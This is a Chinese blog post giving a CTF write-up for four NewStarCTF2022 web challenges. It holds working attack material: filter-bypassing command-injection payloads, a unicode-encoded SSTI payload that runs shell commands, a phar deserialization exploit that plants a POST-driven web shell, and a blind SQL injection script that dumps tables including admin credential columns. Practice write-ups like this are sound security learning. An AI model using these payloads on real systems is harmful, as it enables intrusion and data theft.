<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>NewStarCTF2022-Week4-Web - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="NewStarCTF2022-Week4-Web" />
<meta property="og:description" content="NewStarCTF2022-week4-web So Baby RCE分析payload BabySSTI_TwoUnserializeThree分析payloadpayload 又一个SQL分析payload Rome（没WP） 写在前面：本人小白，文章有什么错误，欢迎各位师傅指点 本文有些地方借鉴Pysnow师傅的wp Pysnow师傅的wp So Baby RCE 考点：空格绕过、关键字符绕过、斜杠绕过
分析 打开题目，发现直接给的源码
&lt;?php error_reporting(0); if(isset($_GET[&#34;cmd&#34;])){ if(preg_match(&#39;/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\&#39;|\]|&#34;|&lt;|&gt;|`|\/| |\\\\|\*/i&#39;,$_GET[&#34;cmd&#34;])){ echo &#34;Don&#39;t Hack Me&#34;; }else{ system($_GET[&#34;cmd&#34;]); } }else{ show_source(__FILE__); } 发现过滤了好多命令！
尝试ls一下
我们知道的空格 / 已经被过滤 空格可以 ${IFS} 替代 ，那么/怎么办？
一种环境变量的替换 ${HOME:0:1} =&gt; 利用环境变量
首先我们先查看一下环境变量有什么 (env被过滤 插入$1 过滤)
可以利用PWD
但是这里不知道怎么 ${PWD:0:1}是没有输出的 但是$PWD是输出的
我们的思路就是找环境变量第一个字符代替/，${PATH:0:1}
那么就换一种思路
知识点
expr -- 用于在UNIX/LINUX下求表达式变量的值 $() -- 可以执行Linux命令 substr -- 截取字符串 Linux字符串下标从一开始 构造
$(expr substr $PWD 1 1) # 绕过空格 $(expr${IFS}substr${IFS}$PWD${IFS}1${IFS}1) 试试是否有结果" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/3943771bcfda46e9eac45669ce274903/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-29T00:11:19+08:00" />
<meta property="article:modified_time" content="2022-10-29T00:11:19+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">NewStarCTF2022-Week4-Web</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-light">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>NewStarCTF2022-week4-web</h4> 
 <ul><li><a href="#So_Baby_RCE_3" rel="nofollow">So Baby RCE</a></li><li><ul><li><a href="#_6" rel="nofollow">分析</a></li><li><a href="#payload_52" rel="nofollow">payload</a></li></ul> 
  </li><li><a href="#BabySSTI_Two_60" rel="nofollow">BabySSTI_Two</a></li><li><a href="#UnserializeThree_73" rel="nofollow">UnserializeThree</a></li><li><ul><li><a href="#_76" rel="nofollow">分析</a></li><li><a href="#payload_102" rel="nofollow">payload</a></li><li><a href="#payload_119" rel="nofollow">payload</a></li></ul> 
  </li><li><a href="#SQL_120" rel="nofollow">又一个SQL</a></li><li><ul><li><a href="#_122" rel="nofollow">分析</a></li><li><a href="#payload_130" rel="nofollow">payload</a></li></ul> 
  </li><li><a href="#RomeWP_240" rel="nofollow">Rome（没WP）</a></li></ul> 
</div> 
<br> 
<strong>写在前面</strong>：本人小白，文章有什么错误，欢迎各位师傅指点 
<br> 本文有些地方借鉴Pysnow师傅的wp 
<a href="https://pysnow.cn/archives/453/" rel="nofollow">Pysnow师傅的wp</a> 
<p></p> 
<h2><a id="So_Baby_RCE_3"></a>So Baby RCE</h2> 
<blockquote> 
 <p>考点：空格绕过、关键字符绕过、斜杠绕过</p> 
</blockquote> 
<h3><a id="_6"></a>分析</h3> 
<p>打开题目，发现直接给的源码</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|&lt;|&gt;|`|\/| |\\\\|\*/i'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
       <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Don't Hack Me"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"cmd"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>发现过滤了好多命令！<br> 尝试ls一下<br> <img src="https://images2.imgbox.com/ff/1b/GkaYwQ4D_o.png" alt="在这里插入图片描述"><br> 我们知道的空格 / 已经被过滤 空格可以 ${IFS} 替代 ，那么/怎么办？<br> 一种环境变量的替换 ${HOME:0:1} =&gt; 利用环境变量<br> 首先我们先查看一下环境变量有什么 (env被过滤 插入$1 过滤)<br> <img src="https://images2.imgbox.com/67/7e/ZihvhdIZ_o.png" alt="在这里插入图片描述"><br> 可以利用PWD</p> 
<blockquote> 
 <p>但是这里不知道怎么 <code>${PWD:0:1}</code>是没有输出的 但是<code>$PWD</code>是输出的<br> <img src="https://images2.imgbox.com/1c/36/jS8TFAQy_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/e8/1b/G1lzyi2p_o.png" alt="在这里插入图片描述"><br> 我们的思路就是找环境变量第一个字符代替/，<code>${PATH:0:1}</code><br> 那么就换一种思路<br> 知识点</p> 
</blockquote> 
<pre><code>expr -- 用于在UNIX/LINUX下求表达式变量的值
$() -- 可以执行Linux命令
substr -- 截取字符串 Linux字符串下标从一开始
</code></pre> 
<p>构造</p> 
<pre><code class="prism language-shell"><span class="token variable"><span class="token variable">$(</span><span class="token function">expr</span> substr <span class="token environment constant">$PWD</span> <span class="token number">1</span> <span class="token number">1</span><span class="token variable">)</span></span>
<span class="token comment"># 绕过空格</span>
<span class="token variable"><span class="token variable">$(</span>expr$<span class="token punctuation">{<!-- --></span><span class="token environment constant">IFS</span><span class="token punctuation">}</span>substr$<span class="token punctuation">{<!-- --></span><span class="token environment constant">IFS</span><span class="token punctuation">}</span><span class="token environment constant">$PWD</span>$<span class="token punctuation">{<!-- --></span><span class="token environment constant">IFS</span><span class="token punctuation">}</span><span class="token number">1</span>$<span class="token punctuation">{<!-- --></span><span class="token environment constant">IFS</span><span class="token punctuation">}</span><span class="token number">1</span><span class="token variable">)</span></span>
</code></pre> 
<p>试试是否有结果<img src="https://images2.imgbox.com/f9/b2/cofd8E9q_o.png" alt="在这里插入图片描述"><br> OK！问题解决<br> <img src="https://images2.imgbox.com/2f/0a/HPHpzBqU_o.png" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/16/df/4shc2hOC_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="payload_52"></a>payload</h3> 
<pre><code>cmd=c$1at${IFS}$(expr${IFS}substr${IFS}$PATH${IFS}1${IFS}1)ffff$1llllaaaaggggg
</code></pre> 
<blockquote> 
 <p>这里看了Pysnow师傅的wp，感觉真是妙不可言<br> 放上payload：<br> <code>cd${IFS}..%26%26cd${IFS}..%26%26cd${IFS}..%26%26sort${IFS}ffff?lllaaaaggggg</code><br> 翻目录，输出flag</p> 
</blockquote> 
<h2><a id="BabySSTI_Two_60"></a>BabySSTI_Two</h2> 
<p>unicode编码一下<br> 我这SSTI其实掌握不全 最近两天补一下<br> 网上搜的wp</p> 
<pre><code>__globals__ 被过滤 使用
{<!-- -->{url_for.__getitem__['__globals__']xxxxx}}

{<!-- -->{url_for.__getitem__['\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f']['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f\u0028\u0027\u006f\u0073\u0027\u0029\u002e\u0070\u006f\u0070\u0065\u006e\u0028\u0027\u0063\u0061\u0074\u0020\u002f\u0066\u006c\u0061\u0067\u005f\u0069\u006e\u005f\u0068\u0033\u0072\u0033\u005f\u0035\u0032\u0064\u0061\u0061\u0064\u0027\u0029\u002e\u0072\u0065\u0061\u0064\u0028\u0029')}}

</code></pre> 
<p><img src="https://images2.imgbox.com/3d/e1/qVhBuug2_o.png" alt="在这里插入图片描述"></p> 
<h2><a id="UnserializeThree_73"></a>UnserializeThree</h2> 
<blockquote> 
 <p>其实提示给的很明显：phar反序列化</p> 
</blockquote> 
<h3><a id="_76"></a>分析</h3> 
<p>打开题目，查看源码发现了一个class.php<br> 访问他！！</p> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/&gt;|&lt;|\?|php|"</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%0a"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"/i"</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
            <span class="token comment">//Same point ,can you bypass me again?</span>
            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"#"</span><span class="token operator">.</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No!"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment"># 发现了什么！</span>
<span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>但是在题目 eval 的时候发现前面拼接了<code>#</code>注释<br> 我的思路<br> 1、闭合前一个&lt;?php 然后新创建一个php标签 但是?php都被过滤不可行<br> 2、换行 \n \r都可以换行 题目 \n = %0a 被过滤 我们选择使用\r绕过<br> 对了上传图片处好像仅仅可以上传jpg</p> 
<h3><a id="payload_102"></a>payload</h3> 
<pre><code class="prism language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Evil</span><span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cmd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"xxxx\rsystem(\$_POST[_]);"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token comment"># 借鉴Pysnow 之前写的有点问题感觉</span>
<span class="token variable">$zip</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getflag.jpg'</span><span class="token punctuation">,</span><span class="token class-name static-context">ZipArchive</span><span class="token operator">::</span><span class="token constant">CREATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getflag.txt'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'getflag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$flag</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">setArchiveComment</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$zip</span><span class="token operator">-&gt;</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h3><a id="payload_119"></a>payload</h3> 
<h2><a id="SQL_120"></a>又一个SQL</h2> 
<blockquote> 
 <p>我使用的布尔盲注，不过看大佬wp并不是 得到flag就是好的解题方法（dog）</p> 
</blockquote> 
<h3><a id="_122"></a>分析</h3> 
<p>打开题目，ok 熟悉的页面<br> 根据提示查询100试试，ok发现f1ag_is_here 应该不是表名就是列名（后面发现错了呜呜）<br> <img src="https://images2.imgbox.com/4f/02/Q02qNwyO_o.png" alt="在这里插入图片描述"><br> 没思路，随便的查询下1和0试试，发现0-&gt;啊哦，这条留言不存在哦～ 1-&gt;好耶！你有这条来自条留言<br> 灵机一动，难道是！！盲注！！<br> 当时我burp fuzz了下 发现ascii substr database等等盲注关键单词没有被过滤 嘿嘿我就不客气了！！<br> 直接上脚本</p> 
<h3><a id="payload_130"></a>payload</h3> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests<span class="token punctuation">,</span> time
<span class="token comment"># 爆破数据库名字</span>
<span class="token keyword">def</span> <span class="token function">get_schema_name</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> schema_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># chars = 'abcdefghijklmnopqrstuvwxyz0123456789!_,~'</span>
    flag <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> schema_length <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        left <span class="token operator">=</span> <span class="token number">32</span>
        right <span class="token operator">=</span> <span class="token number">127</span>
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
            data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^(ascii(substr(database(),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>i<span class="token punctuation">}</span></span><span class="token string">,1))&gt;</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>mid<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token punctuation">}</span>
            resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> success <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                right <span class="token operator">=</span> mid
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
            mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        <span class="token keyword">if</span> mid <span class="token operator">==</span> <span class="token number">32</span> <span class="token keyword">or</span> mid <span class="token operator">==</span> <span class="token number">126</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>

<span class="token comment"># 爆破所有表</span>
<span class="token keyword">def</span> <span class="token function">get_tables</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> schema_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    count <span class="token operator">=</span> <span class="token number">1</span>
    sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select(group_concat(table_name))from(information_schema.tables)where(table_schema='</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>schema_name<span class="token punctuation">}</span></span><span class="token string">')"</span></span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>sql<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>count<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>num<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token punctuation">}</span>
            resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> success <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text <span class="token keyword">or</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'~'</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>

<span class="token comment"># 爆破关键表的列</span>
<span class="token keyword">def</span> <span class="token function">get_column_by_table</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> table<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    count <span class="token operator">=</span> <span class="token number">1</span>
    sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select(group_concat(column_name))from(information_schema.columns)where(table_name='</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table<span class="token punctuation">}</span></span><span class="token string">')"</span></span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>sql<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>count<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>num<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token punctuation">}</span>
            resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> success <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token number">126</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"~"</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span>

<span class="token comment"># 爆破关键的具体字符 username password</span>
<span class="token keyword">def</span> <span class="token function">get_value</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> table<span class="token punctuation">,</span> <span class="token operator">*</span>columns<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> <span class="token string">''</span>
    count <span class="token operator">=</span> <span class="token number">1</span>
    c <span class="token operator">=</span> <span class="token string">''</span>
    <span class="token keyword">for</span> column <span class="token keyword">in</span> columns<span class="token punctuation">:</span>
        c <span class="token operator">+=</span> column <span class="token operator">+</span> <span class="token string">",'-',"</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token comment"># 根据提示应该是id=100有flag</span>
            sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"select(group_concat(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>c<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token format-spec">-5]</span><span class="token punctuation">}</span></span><span class="token string">))from(</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>table<span class="token punctuation">}</span></span><span class="token string">)where(id=100)"</span></span>
            data <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token string">"name"</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"0^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>sql<span class="token punctuation">}</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>count<span class="token punctuation">}</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>num<span class="token punctuation">}</span></span><span class="token string">)"</span></span><span class="token punctuation">}</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>
            resp <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
            <span class="token keyword">if</span> success <span class="token keyword">in</span> resp<span class="token punctuation">.</span>text <span class="token keyword">or</span> num <span class="token operator">==</span> <span class="token number">126</span><span class="token punctuation">:</span>
                result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>
                <span class="token keyword">break</span>
            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
        count <span class="token operator">+=</span> <span class="token number">1</span>
        <span class="token keyword">if</span> result<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'~'</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># 布尔盲注</span>
    session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token comment"># 成功的标识</span>
    success <span class="token operator">=</span> <span class="token string">'好耶！'</span>
    url <span class="token operator">=</span> <span class="token string">"http://234d565f-bb2c-4daf-b44c-f8a6c546a4ec.node4.buuoj.cn:81/comments.php"</span>
    <span class="token comment"># 数据库名字 wfy</span>
    <span class="token comment"># get_schema_name(url=url,schema_length=3)</span>
    <span class="token comment"># 获取表 wfy_admin,wfy_comments,wfy_information</span>
    <span class="token comment"># get_tables(url=url, schema_name='wfy')</span>
    <span class="token comment"># 获得列名</span>
    <span class="token comment"># wfy_information:title,header</span>
    <span class="token comment"># wfy_comments:id,text,user,name,display</span>
    <span class="token comment"># wfy_admin:Id,username,password,cookie</span>
    <span class="token comment"># get_column_by_table(url=url,table='wfy_admin')</span>
    <span class="token comment"># 具体字段 100-f1ag_is_here-You have no way to get my F1AG-flag{We_0nly_have_2wo_choices}</span>
    <span class="token comment"># get_value(url,'text')</span>
</code></pre> 
<p>跑出来flag:<code>flag{We_0nly_have_2wo_choices}</code></p> 
<blockquote> 
 <p>这里我大部分没有使用二分查找，跑的速度可能慢些 主要我懒得改了 直接遍历是我之前写过一个版本 这里直接拿来修改咯</p> 
</blockquote> 
<p>小伙伴们 注意看这里~~<br> 看了Pysnow师傅的wp 发现考点好像是insert注入 哦弄！！small question！ 解出来就好哦</p> 
<h2><a id="RomeWP_240"></a>Rome（没WP）</h2> 
<p>没有学习JAVA，暂时不会哦 抱歉师傅们</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/c79a2673c4a54059a22692d965d24d76/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Springboot上通过MybatisPlus将MySQL的数据取出，并通过浏览器来查看读取的数据</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/de35a20c746fb416934503fbe3f3ff48/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">卷积和全连接层的模型参数计算详解，详细到神经元个数一个个算，天啊，以VGG16为例</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
